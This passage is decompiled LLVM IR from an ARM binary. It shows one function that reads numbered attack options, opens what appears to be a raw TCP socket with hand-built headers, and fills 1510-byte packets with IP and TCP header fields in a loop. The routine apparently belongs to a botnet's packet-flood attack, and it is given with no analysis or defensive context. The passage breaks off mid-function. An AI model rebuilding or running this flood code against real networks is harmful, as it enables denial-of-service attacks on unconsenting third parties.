  br i1 %v3_be24, label %dec_label_pc_bf58, label %dec_label_pc_be38

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf38, %dec_label_pc_bdfc
  %v0_bf58 = call i32 @function_fe60()
  %v1_bf58 = trunc i32 %v0_bf58 to i8
  store i32 %v1_b8e8, i32* %lr.global-to-local, align 4
  %v4_bf60 = sdiv i32 %v0_bf58, 256
  store i32 %v4_bf60, i32* %r3.global-to-local, align 4
  store i1 %v2_be3c, i1* %cpsr_z.global-to-local, align 1
  %v3_bf68 = load i32, i32* @r4, align 4
  %v4_bf68 = add i32 %v3_bf68, 4
  %v5_bf68 = inttoptr i32 %v4_bf68 to i8*
  store i8 %v1_bf58, i8* %v5_bf68, align 1
  %v0_bf6c = load i32, i32* %r3.global-to-local, align 4
  %v1_bf6c = trunc i32 %v0_bf6c to i8
  %v2_bf6c = load i32, i32* @r4, align 4
  %v3_bf6c = add i32 %v2_bf6c, 5
  %v4_bf6c = inttoptr i32 %v3_bf6c to i8*
  store i8 %v1_bf6c, i8* %v4_bf6c, align 1
  %v0_bf70 = load i32, i32* @r4, align 4
  %v1_bf70 = add i32 %v0_bf70, 40
  store i32 %v1_bf70, i32* %r0.global-to-local, align 4
  %v0_bf74 = load i32, i32* @sb, align 4
  store i32 %v0_bf74, i32* @r1, align 4
  %v0_bf78 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf78, label %dec_label_pc_be4c, label %dec_label_pc_bf7c

dec_label_pc_bf7c:                                ; preds = %dec_label_pc_be38, %dec_label_pc_bf58
  %v0_bf7c = phi i32 [ %v1_be40, %dec_label_pc_be38 ], [ %v1_bf70, %dec_label_pc_bf58 ]
  %v1_bf7c = inttoptr i32 %v0_bf7c to i8*
  %v2_bf7c = call i32 @function_1003c(i8* %v1_bf7c)
  store i32 %v2_bf7c, i32* %r0.global-to-local, align 4
  %v2_be4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_be4c

; uselistorder directives
  uselistorder i32 %v0_bf70, { 1, 0 }
  uselistorder i32 %v7_bf44, { 1, 2, 0 }
  uselistorder i32 %v1_bf2c, { 1, 2, 0 }
  uselistorder i32 %v1_bf28, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_becc, { 0, 2, 1 }
  uselistorder i32 %v0_beb4, { 1, 0, 2 }
  uselistorder i32 %v3_be90, { 1, 0 }
  uselistorder i32 %v3_be70, { 3, 2, 0, 1 }
  uselistorder i32 %v2_be5c, { 0, 2, 1 }
  uselistorder i32 %v0_be40, { 1, 0 }
  uselistorder i32 %v0_bdfc, { 1, 0 }
  uselistorder i32 %v0_bdf0, { 1, 0 }
  uselistorder i1 %v3_be24, { 2, 3, 1, 0 }
  uselistorder i32 %v1_bdd8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bd2c, { 0, 2, 1 }
  uselistorder i32 %v3_bd0c, { 1, 0 }
  uselistorder i32 %v0_bce0, { 1, 0, 2 }
  uselistorder i32 %v3_bcd4, { 1, 0 }
  uselistorder i32 %v3_bc68, { 1, 0 }
  uselistorder i32 %v0_bc5c, { 1, 0 }
  uselistorder i32 %v3_bbe4, { 1, 0 }
  uselistorder i32 %v3_bbb4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_bb88, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_bb80, { 1, 0 }
  uselistorder i32 %v4_bb68, { 1, 0 }
  uselistorder i32 %v0_bb64, { 0, 2, 1 }
  uselistorder i1 %v7_bad4, { 1, 0 }
  uselistorder i32 %v7_bacc, { 0, 2, 1, 3 }
  uselistorder i32 %v5_bb18, { 1, 0 }
  uselistorder i1 %v9_bafc, { 1, 0 }
  uselistorder i32 %v4_bb10, { 1, 0 }
  uselistorder i32 %v4_bb0c, { 1, 0 }
  uselistorder i32 %v8_ba20, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ba0c, { 1, 0 }
  uselistorder i32 %v0_b9fc, { 1, 0, 2, 3 }
  uselistorder i1 %v7_b984, { 1, 0 }
  uselistorder i32 %v3_b980, { 2, 1, 0, 3 }
  uselistorder i32 %v1_bd98, { 1, 0 }
  uselistorder i32 %v1_bd80, { 1, 0 }
  uselistorder i32 %v1_bd68, { 1, 0 }
  uselistorder i32 %v1_bd50, { 1, 0 }
  uselistorder i32 %v1_bd38, { 1, 0 }
  uselistorder i32 %v5_bb14, { 1, 0 }
  uselistorder i32 %v3_ba6893, { 1, 0 }
  uselistorder i1 %v2_bb2c, { 1, 0 }
  uselistorder i32 %v1_bb28, { 1, 0 }
  uselistorder i32 %v4_bb24, { 2, 0, 1 }
  uselistorder i32 %v4_bb08, { 1, 0 }
  uselistorder i1 %v3_ba50, { 1, 0 }
  uselistorder i32 %v8_b94c, { 2, 1, 0 }
  uselistorder i32 %v8_b948, { 1, 2, 0 }
  uselistorder i32 %v3_b940, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_b93c, { 0, 1, 3, 2 }
  uselistorder i1 %v7_b930, { 1, 0 }
  uselistorder i1 %v7_b900, { 1, 0 }
  uselistorder i32 %v3_b8fc, { 2, 0, 1 }
  uselistorder i32 %v3_b8f8, { 5, 6, 1, 3, 4, 7, 8, 2, 0, 9 }
  uselistorder i32 %v1_b8e8, { 1, 3, 2, 0 }
  uselistorder i32 %v1_b890, { 1, 0 }
  uselistorder i32 %v1_b850, { 1, 0 }
  uselistorder i32 %v1_b830, { 1, 0 }
  uselistorder i32 %v1_b810, { 1, 0 }
  uselistorder i32 %v1_b7d8, { 1, 0 }
  uselistorder i32 %v2_b758, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32 %v2_b748, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_b72c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 6, 5, 10, 7, 8, 11, 9, 19, 12, 13, 14, 15, 16, 17, 18, 23, 20, 21, 22, 24, 26, 25, 28, 27, 31, 29, 32, 33, 30, 34, 36, 35, 37, 38, 40, 39, 44, 41, 42, 43, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_bf7c, { 1, 0 }
  uselistorder label %dec_label_pc_be4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bdd4, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %.thread6, { 2, 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %dec_label_pc_bb5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ba94, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ba44, { 1, 0 }
}

define i32 @function_bf88(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bf88:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_bf8c = urem i32 %arg1, 256
  store i32 %v1_bf8c, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_bfa4 = urem i32 %arg3, 256
  store i32 %v1_bfa4, i32* @r4, align 4
  %v2_bfa8 = call i32 @function_14254(i32 %v1_bf8c, i32 4)
  %v0_bfac = load i32, i32* @r5, align 4
  store i32 %v0_bfac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bfbc = load i32, i32* @r4, align 4
  %v5_bfc0 = inttoptr i32 %v0_bfac to i32*
  %v6_bfc0 = call i32 @function_a4e8(i32 %v0_bfbc, i32* %v5_bfc0, i32 2, i32 0)
  %v1_bfcc = urem i32 %v6_bfc0, 256
  store i32 %v1_bfcc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bfd8 = load i32, i32* @r5, align 4
  store i32 %v0_bfd8, i32* %r1.global-to-local, align 4
  %v0_bfdc = load i32, i32* @r4, align 4
  %v5_bfe0 = trunc i32 %v6_bfc0 to i8
  %v6_bfe4 = inttoptr i32 %v0_bfd8 to i32*
  %v7_bfe4 = call i32 @function_a4e8(i32 %v0_bfdc, i32* %v6_bfe4, i32 3, i32 65535)
  %v0_bfe8 = load i32, i32* @r5, align 4
  store i32 %v0_bfe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bfe4, i32* @r8, align 4
  %v0_bff8 = load i32, i32* @r4, align 4
  %v4_bffc = inttoptr i32 %v0_bfe8 to i32*
  %v5_bffc = call i32 @function_a4e8(i32 %v0_bff8, i32* %v4_bffc, i32 4, i32 64)
  %v1_c004 = urem i32 %v5_bffc, 256
  store i32 %v1_c004, i32* %ip.global-to-local, align 4
  %v0_c008 = load i32, i32* @r5, align 4
  store i32 %v0_c008, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c014 = load i32, i32* @r4, align 4
  %v6_c01c = inttoptr i32 %v0_c008 to i32*
  %v7_c01c = call i32 @function_a4e8(i32 %v0_c014, i32* %v6_c01c, i32 5, i32 0)
  %v1_c028 = urem i32 %v7_c01c, 256
  store i32 %v1_c028, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c034 = load i32, i32* @r5, align 4
  store i32 %v0_c034, i32* %r1.global-to-local, align 4
  %v0_c038 = load i32, i32* @r4, align 4
  %v5_c040 = inttoptr i32 %v0_c034 to i32*
  %v6_c040 = call i32 @function_a4e8(i32 %v0_c038, i32* %v5_c040, i32 6, i32 65535)
  %v0_c048 = load i32, i32* @r5, align 4
  store i32 %v0_c048, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c040, i32* @r7, align 4
  %v0_c058 = load i32, i32* @r4, align 4
  %v4_c05c = inttoptr i32 %v0_c048 to i32*
  %v5_c05c = call i32 @function_a4e8(i32 %v0_c058, i32* %v4_c05c, i32 7, i32 65535)
  %v0_c064 = load i32, i32* @r5, align 4
  store i32 %v0_c064, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c05c, i32* @r6, align 4
  %v0_c074 = load i32, i32* @r4, align 4
  %v4_c078 = inttoptr i32 %v0_c064 to i32*
  %v5_c078 = call i32 @function_a4e8(i32 %v0_c074, i32* %v4_c078, i32 17, i32 65535)
  %v0_c084 = load i32, i32* @r5, align 4
  store i32 %v0_c084, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_c090 = load i32, i32* @r4, align 4
  %v5_c094 = inttoptr i32 %v0_c084 to i32*
  %v6_c094 = call i32 @function_a4e8(i32 %v0_c090, i32* %v5_c094, i32 18, i32 65535)
  %v0_c098 = load i32, i32* @r5, align 4
  store i32 %v0_c098, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0a8 = load i32, i32* @r4, align 4
  %v5_c0ac = inttoptr i32 %v0_c098 to i32*
  %v6_c0ac = call i32 @function_a4e8(i32 %v0_c0a8, i32* %v5_c0ac, i32 11, i32 0)
  %v0_c0b0 = load i32, i32* @r5, align 4
  store i32 %v0_c0b0, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c0c0 = load i32, i32* @r4, align 4
  %v5_c0c4 = inttoptr i32 %v0_c0b0 to i32*
  %v6_c0c4 = call i32 @function_a4e8(i32 %v0_c0c0, i32* %v5_c0c4, i32 12, i32 1)
  %v0_c0c8 = load i32, i32* @r5, align 4
  store i32 %v0_c0c8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0d8 = load i32, i32* @r4, align 4
  %v5_c0dc = inttoptr i32 %v0_c0c8 to i32*
  %v6_c0dc = call i32 @function_a4e8(i32 %v0_c0d8, i32* %v5_c0dc, i32 13, i32 0)
  %v0_c0e0 = load i32, i32* @r5, align 4
  store i32 %v0_c0e0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c0f0 = load i32, i32* @r4, align 4
  %v5_c0f4 = inttoptr i32 %v0_c0e0 to i32*
  %v6_c0f4 = call i32 @function_a4e8(i32 %v0_c0f0, i32* %v5_c0f4, i32 14, i32 0)
  %v0_c0f8 = load i32, i32* @r5, align 4
  store i32 %v0_c0f8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c108 = load i32, i32* @r4, align 4
  %v5_c10c = inttoptr i32 %v0_c0f8 to i32*
  %v6_c10c = call i32 @function_a4e8(i32 %v0_c108, i32* %v5_c10c, i32 15, i32 0)
  %v0_c110 = load i32, i32* @r5, align 4
  store i32 %v0_c110, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c120 = load i32, i32* @r4, align 4
  %v5_c124 = inttoptr i32 %v0_c110 to i32*
  %v6_c124 = call i32 @function_a4e8(i32 %v0_c120, i32* %v5_c124, i32 16, i32 0)
  %v0_c128 = load i32, i32* @r5, align 4
  store i32 %v0_c128, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_c138 = load i32, i32* @r4, align 4
  %v5_c13c = inttoptr i32 %v0_c128 to i32*
  %v6_c13c = call i32 @function_a4e8(i32 %v0_c138, i32* %v5_c13c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c14c = load i32, i32* @r5, align 4
  store i32 %v0_c14c, i32* %r1.global-to-local, align 4
  %v0_c150 = load i32, i32* @r4, align 4
  %v4_c154 = inttoptr i32 %v0_c14c to i32*
  %v5_c154 = call i32 @function_a4e8(i32 %v0_c150, i32* %v4_c154, i32 1, i32 1)
  %v2_c160 = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_c160, i32* %r3.global-to-local, align 4
  %v1_c164 = urem i32 %v5_c154, 256
  store i32 %v1_c164, i32* %ip.global-to-local, align 4
  %v0_c168 = load i32, i32* @r5, align 4
  store i32 %v0_c168, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c170 = load i32, i32* @r4, align 4
  %v5_c178 = inttoptr i32 %v0_c168 to i32*
  %v6_c178 = call i32 @function_a47c(i32 %v0_c170, i32* %v5_c178, i32 25, i32 %v2_c160, i32 %v1_c164)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c18c = call i32 @function_13f50(i32 2, i32 3, i32 6)
  %v7_c190 = icmp eq i32 %v3_c18c, -1
  store i1 %v7_c190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c190, label %dec_label_pc_c5c8, label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_bf88
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c1a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c1a4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c1b8 = call i32 @function_13f20(i32 %v3_c18c, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  %v7_c1bc = icmp eq i32 %v6_c1b8, -1
  store i1 %v7_c1bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c1bc, label %dec_label_pc_c5c0, label %dec_label_pc_c1c4

dec_label_pc_c1c4:                                ; preds = %dec_label_pc_c19c
  %v0_c1c4 = load i32, i32* @r8, align 4
  %v0_c1c8 = load i32, i32* @r7, align 4
  %v0_c1cc = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c1d4 = urem i32 %v0_c1c4, 65536
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  %v3_c1d8 = urem i32 %v0_c1c8, 65536
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v3_c1dc = urem i32 %v0_c1cc, 65536
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v0_c1e0 = load i32, i32* @fp, align 4
  %v2_c1e0 = icmp eq i32 %v0_c1e0, 0
  store i1 %v2_c1e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp75 = icmp slt i32 %v0_c1e0, 1
  br i1 %tmp75, label %dec_label_pc_c6e0, label %dec_label_pc_c1f8

dec_label_pc_c1f8:                                ; preds = %dec_label_pc_c1c4
  %v1_c200 = add i32 %v6_c13c, 40
  %tmp76 = mul i32 %v1_c200, 256
  %v1_c214 = urem i32 %v0_c1c8, 256
  %v1_c218 = and i32 %tmp76, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %v3_c21c = mul nuw nsw i32 %v1_c214, 256
  %v1_c224 = urem i32 %v0_c1cc, 256
  %tmp77 = udiv i32 %v0_c1cc, 256
  %v3_c228 = urem i32 %tmp77, 256
  %tmp78 = udiv i32 %v1_c200, 256
  %v4_c22c = urem i32 %tmp78, 256
  %v5_c22c = or i32 %v4_c22c, %v1_c218
  store i32 %v5_c22c, i32* @lr, align 4
  %tmp79 = udiv i32 %v0_c1c8, 256
  %v4_c230 = urem i32 %tmp79, 256
  %v5_c230 = or i32 %v4_c230, %v3_c21c
  store i32 %v5_c230, i32* @sl, align 4
  %v4_c234 = mul nuw nsw i32 %v1_c224, 256
  %v5_c234 = or i32 %v4_c234, %v3_c228
  store i32 %v5_c234, i32* @r6, align 4
  %tmp80 = udiv i32 %v0_c1c4, 256
  %v3_c244 = urem i32 %tmp80, 256
  %v1_c248 = urem i32 %v0_c1c4, 256
  %tmp81 = mul i32 %v5_c078, 256
  %v1_c250 = and i32 %tmp81, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %v1_c254 = urem i32 %v6_c0ac, 2
  %v1_c258 = urem i32 %v6_c0c4, 2
  %v1_c25c = urem i32 %v6_c0dc, 2
  %tmp82 = udiv i32 %v5_c078, 256
  %v4_c260 = urem i32 %tmp82, 256
  %v5_c260 = or i32 %v4_c260, %v1_c250
  store i32 %v5_c260, i32* @r8, align 4
  %v1_c280 = urem i32 %v6_c0f4, 2
  %v1_c284 = urem i32 %v6_c10c, 2
  %v1_c288 = urem i32 %v6_c124, 2
  %v1_c28c = urem i32 %v6_c0dc, 256
  %v4_c290 = mul nuw nsw i32 %v1_c248, 256
  %v5_c290 = or i32 %v4_c290, %v3_c244
  store i32 %v5_c290, i32* @r5, align 4
  %v3_c2a425 = udiv i32 %v1_c218, 256
  store i32 %v3_c2a425, i32* %r3.global-to-local, align 4
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  store i32 %v1_c214, i32* %r1.global-to-local, align 4
  store i32 %v1_c224, i32* %r2.global-to-local, align 4
  %v5_c2c0 = trunc i32 %v0_c1c8 to i8
  store i32 0, i32* @r4, align 4
  %sext8 = mul i32 %v5_bffc, 16777216
  %v4_c31c = sdiv i32 %sext8, 16777216
  %sext9 = mul i32 %v0_c1c4, 16777216
  %v4_c328 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %tmp78, 16777216
  %v4_c33c = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %v1_c218, 65536
  %v4_c340 = sdiv i32 %sext11, 16777216
  %tmp = sub nsw i32 0, %v1_c254
  %v4_c390 = and i32 %tmp, 32
  %tmp93 = sub nsw i32 0, %v1_c258
  %v4_c3a4 = and i32 %tmp93, 16
  %tmp94 = sub nsw i32 0, %v1_c25c
  %v4_c3b8 = and i32 %tmp94, 8
  %tmp95 = sub nsw i32 0, %v1_c280
  %v4_c3cc = and i32 %tmp95, 4
  %tmp96 = sub nsw i32 0, %v1_c284
  %v3_c3e0 = and i32 %tmp96, 2
  %sext12 = mul i32 %v0_c1cc, 16777216
  %v7_c410 = sdiv i32 %sext12, 16777216
  %v1_c324 = trunc i32 %v4_c31c to i8
  %extract.t = trunc i32 %v4_c328 to i8
  %v3_c410 = sext i8 %v5_c2c0 to i32
  %v2_c434 = icmp eq i32 %v1_c28c, 0
  br label %dec_label_pc_c2cc

dec_label_pc_c2cc:                                ; preds = %bb89, %dec_label_pc_c1f8
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_c2d8 = call i32 @function_14254(i32 1510, i32 1)
  store i32 %v2_bfa8, i32* %ip.global-to-local, align 4
  %v2_c2e4 = load i32, i32* @r4, align 4
  %v5_c2e4 = mul i32 %v2_c2e4, 4
  %v6_c2e4 = add i32 %v5_c2e4, %v2_bfa8
  %v7_c2e4 = inttoptr i32 %v6_c2e4 to i32*
  store i32 %v2_c2d8, i32* %v7_c2e4, align 4
  %v3_c2e8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c2e8, i32* %r3.global-to-local, align 4
  %v0_c2ec = load i32, i32* %ip.global-to-local, align 4
  %v4_c2ec = mul i32 %v3_c2e8, 4
  %v5_c2ec = add i32 %v0_c2ec, %v4_c2ec
  %v6_c2ec = inttoptr i32 %v5_c2ec to i32*
  %v7_c2ec = load i32, i32* %v6_c2ec, align 4
  store i32 %v7_c2ec, i32* @r7, align 4
  %v1_c2f0 = inttoptr i32 %v7_c2ec to i8*
  %v2_c2f0 = load i8, i8* %v1_c2f0, align 1
  %tmp97 = urem i8 %v2_c2f0, 16
  %v1_c2f4 = zext i8 %tmp97 to i32
  %v1_c2f8 = or i32 %v1_c2f4, 64
  store i32 %v1_c2f8, i32* %r2.global-to-local, align 4
  %v1_c2fc = trunc i32 %v1_c2f8 to i8
  store i8 %v1_c2fc, i8* %v1_c2f0, align 1
  %v0_c300 = load i32, i32* @r7, align 4
  %v1_c300 = inttoptr i32 %v0_c300 to i8*
  %v2_c300 = load i8, i8* %v1_c300, align 1
  %v1_c304 = and i8 %v2_c300, -16
  %v1_c308 = or i8 %v1_c304, 5
  store i32 %v1_c028, i32* %r1.global-to-local, align 4
  store i8 %v1_c308, i8* %v1_c300, align 1
  %v2_c318 = load i32, i32* @r7, align 4
  %v3_c318 = add i32 %v2_c318, 1
  %v4_c318 = inttoptr i32 %v3_c318 to i8*
  store i8 %v5_bfe0, i8* %v4_c318, align 1
  store i32 %v4_c31c, i32* %r3.global-to-local, align 4
  %v0_c320 = load i32, i32* %r1.global-to-local, align 4
  %v2_c320 = icmp eq i32 %v0_c320, 0
  store i1 %v2_c320, i1* %cpsr_z.global-to-local, align 1
  %v2_c324 = load i32, i32* @r7, align 4
  %v3_c324 = add i32 %v2_c324, 8
  %v4_c324 = inttoptr i32 %v3_c324 to i8*
  store i8 %v1_c324, i8* %v4_c324, align 1
  store i32 %v4_c328, i32* %r2.global-to-local, align 4
  %v0_c32c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c32c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c2cc
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c330 = load i32, i32* @r7, align 4
  %v4_c330 = add i32 %v3_c330, 6
  %v5_c330 = inttoptr i32 %v4_c330 to i8*
  store i8 64, i8* %v5_c330, align 1
  %v0_c338.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t26 = trunc i32 %v0_c338.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c2cc, %bb
  %v0_c338.off0 = phi i8 [ %extract.t, %dec_label_pc_c2cc ], [ %extract.t26, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_c338 = load i32, i32* @r7, align 4
  %v3_c338 = add i32 %v2_c338, 5
  %v4_c338 = inttoptr i32 %v3_c338 to i8*
  store i8 %v0_c338.off0, i8* %v4_c338, align 1
  store i32 %v4_c33c, i32* %ip.global-to-local, align 4
  store i32 %v4_c340, i32* %r1.global-to-local, align 4
  %v0_c344 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c344, label %bb84, label %bb83

bb83:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %.thread, %bb83
  %v0_c348 = load i32, i32* %r3.global-to-local, align 4
  %v1_c348 = trunc i32 %v0_c348 to i8
  %v2_c348 = load i32, i32* @r7, align 4
  %v3_c348 = add i32 %v2_c348, 9
  %v4_c348 = inttoptr i32 %v3_c348 to i8*
  store i8 %v1_c348, i8* %v4_c348, align 1
  %v0_c34c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c34c, label %bb86, label %bb85

bb85:                                             ; preds = %bb84
  %v1_c34c = load i32, i32* %r2.global-to-local, align 4
  %v2_c34c = trunc i32 %v1_c34c to i8
  %v3_c34c = load i32, i32* @r7, align 4
  %v4_c34c = add i32 %v3_c34c, 7
  %v5_c34c = inttoptr i32 %v4_c34c to i8*
  store i8 %v2_c34c, i8* %v5_c34c, align 1
  br label %bb86

bb86:                                             ; preds = %bb84, %bb85
  %v3_c350 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c350, i32* %r2.global-to-local, align 4
  %v0_c354 = load i32, i32* %ip.global-to-local, align 4
  %v1_c354 = trunc i32 %v0_c354 to i8
  %v2_c354 = load i32, i32* @r7, align 4
  %v3_c354 = add i32 %v2_c354, 2
  %v4_c354 = inttoptr i32 %v3_c354 to i8*
  store i8 %v1_c354, i8* %v4_c354, align 1
  store i32 %v6_c178, i32* %ip.global-to-local, align 4
  %v0_c35c = load i32, i32* %r2.global-to-local, align 4
  %v3_c35c = mul i32 %v0_c35c, 32
  store i32 %v3_c35c, i32* %r3.global-to-local, align 4
  %v1_c360 = load i32, i32* @r7, align 4
  %v2_c360 = add i32 %v1_c360, 12
  %v3_c360 = inttoptr i32 %v2_c360 to i32*
  store i32 %v6_c178, i32* %v3_c360, align 4
  %v0_c364 = load i32, i32* %r3.global-to-local, align 4
  %v1_c364 = load i32, i32* %r2.global-to-local, align 4
  %tmp98 = mul i32 %v1_c364, -8
  %v5_c364 = add i32 %v0_c364, %tmp98
  %v1_c368 = load i32, i32* @sb, align 4
  %v2_c368 = add i32 %v1_c368, %v5_c364
  store i32 %v2_c368, i32* %r3.global-to-local, align 4
  %v1_c36c = add i32 %v2_c368, 16
  %v2_c36c = inttoptr i32 %v1_c36c to i32*
  %v3_c36c = load i32, i32* %v2_c36c, align 4
  store i32 %v3_c36c, i32* %r2.global-to-local, align 4
  %v0_c370 = load i32, i32* %r1.global-to-local, align 4
  %v1_c370 = trunc i32 %v0_c370 to i8
  %v2_c370 = load i32, i32* @r7, align 4
  %v3_c370 = add i32 %v2_c370, 3
  %v4_c370 = inttoptr i32 %v3_c370 to i8*
  store i8 %v1_c370, i8* %v4_c370, align 1
  %v0_c374 = load i32, i32* @r5, align 4
  %v1_c374 = trunc i32 %v0_c374 to i8
  %v2_c374 = load i32, i32* @r7, align 4
  %v3_c374 = add i32 %v2_c374, 4
